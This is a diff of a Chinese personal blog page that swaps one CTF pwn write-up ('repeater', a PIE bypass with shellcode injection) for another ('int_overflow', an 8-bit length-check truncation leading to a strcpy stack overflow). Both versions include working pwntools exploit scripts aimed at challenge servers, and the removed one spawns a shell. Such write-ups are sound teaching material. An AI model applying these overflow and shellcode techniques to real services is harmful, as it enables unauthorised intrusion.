@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="repeater_wp, 矢坕个人博客">
+    <meta name="keywords" content="int_overflow, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>repeater_wp | 矢坕个人博客</title>
+    <title>int_overflow | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">repeater_wp</h1>
+                    <h1 class="description center-align post-title">int_overflow</h1>
                 </div>
             </div>
         </div>
@@ -443,21 +443,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-12-26
+                    2022-12-31
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-26
+                    2022-12-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    391
+                    381
                 </div>
                 
 
@@ -482,22 +482,28 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h2><p>遇到的第一题开PIE保护机制的pwn题，写一篇记录一下<br>PIE保护机制就是使程序的基地址随机化让我们无法进行shellcode的注入、rop链的搭建等，因此需要解题的第一件事就是找出程序的基地址，目标明确！<br>首先先将其checksec一下：<br><img src="/images/repeater-wp/1.png"><br>发现此题只开了PIE保护，NX保护机制没开可以实现shellcode注入，因此目标：找出基地址，并实现shellcode注入获取shell。<br>将其拖入IDA进行查看：<br><img src="/images/repeater-wp/2.png"><br>实际地址&#x3D;基地址+偏移地址，想要实际地址要知道基地址和偏移地址。在图中告诉我们s的偏移地址为rbp-30h，v5的偏移地址为rbp-10h二者相差20h（32字节），<br>read函数以s的地址为底可以溢出64个字节可以覆盖至返回地址！<br>对于sub_982（byte_202040，48ull）函数的功能单看应该是看不出来的但我们在终端中可以测试这个函数的功能<br><img src="/images/repeater-wp/3.png"><br>我们发现这个函数是进行输入名字的，通过浅浅分析它把名字放到了202040这个地址，可以将shellcode注入这里。<br>main函数偏移地址可以直接查看：<br><img src="/images/repeater-wp/4.png"><br>所以整体思路用exp来表示：</p>
+                <h2 id="int-overflow-wp"><a href="#int-overflow-wp" class="headerlink" title="int_overflow  wp"></a>int_overflow  wp</h2><p>这题涉及到了整数溢出漏洞，值得写一篇博客。<br>先checksec一下：<br><img src="/images/int-overflow/1.png"><br>只开了NX保护机制<br>拖入IDA查看：<br><img src="/images/int-overflow/2.png"><br>主函数里没有什么可以利用的<br>打开login（）函数：<br><img src="/images/int-overflow/3.png"><br>有read函数但是无法溢出……打开check_passwd函数这里涉及到一个知识点unsigned_int8定义的是一个无符号型8位整数<br>具体解释如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">int8取值范围是-128 - 127
+
+unsigned int8 0-255
+
+Int16 意思是16位整数(16bit integer)，相当于short 占2个字节 -32768 ~ 32767
+
+Int32 意思是32位整数(32bit integer), 相当于 int 占4个字节 -2147483648 ~ 2147483647
+
+Int64 意思是64位整数(64bit interger), 相当于 long long 占8个字节 -9223372036854775808 ~ 9223372036854775807<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里涉及到一个整数溢出：strlen函数读取buf的字符长度以int类型返回是32位字节的，而将它赋给了v3如果返回值大于255则会发生整数溢出，将高位字节截断保留低位字节<br>我们看到if函数的else部分是我们可以利用的，有个危险函数strcpy（）可以复制任意长度字符串，这里可以将s的字符串复制到dest数组并发生溢出<br>那思路就拟好了先让v3在4~8区间内判断到else区间执行然后该怎么覆盖怎么覆盖<br>dest的栈空间如下：<br><img src="/images/int-overflow/4.png"><br>上exp：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span><span class="token number">64894</span><span class="token punctuation">)</span>
-context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
-shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"you :\n0x"</span><span class="token punctuation">)</span>
-main_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
-b_addr<span class="token operator">=</span>main_addr<span class="token operator">-</span><span class="token number">0xa33</span>
-shellcode_addr<span class="token operator">=</span>b_addr<span class="token operator">+</span><span class="token number">0x202040</span>
-payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>获得shell。</p>
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"223.112.5.156"</span><span class="token punctuation">,</span><span class="token number">63036</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804868b</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">232</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"username:\n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"passwd:\n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>获得flag：<br><img src="/images/int-overflow/5.png"></p>
 
                 
             </div>
@@ -524,7 +530,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2022/12/26/repeater-wp/">http://airunfive.github.io/2022/12/26/repeater-wp/</a>
+                    <a href="http://airunfive.github.io/2022/12/31/int-overflow/">http://airunfive.github.io/2022/12/31/int-overflow/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -729,54 +735,18 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/12/27/CGfsb-wp/">
+                <a href="/2022/12/31/int-overflow/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="CGfsb_wp">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="int_overflow">
                         
-                        <span class="card-title">CGfsb_wp</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-27
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            矢坕
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/12/25/hello-pwn/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="hello_pwn">
-                        
-                        <span class="card-title">hello_pwn</span>
+                        <span class="card-title">int_overflow</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -787,7 +757,45 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            矢坕
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/12/28/guess-num/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="guess_num">
+                        
+                        <span class="card-title">guess_num</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-28
                             </span>
                         <span class="publish-author">
                             
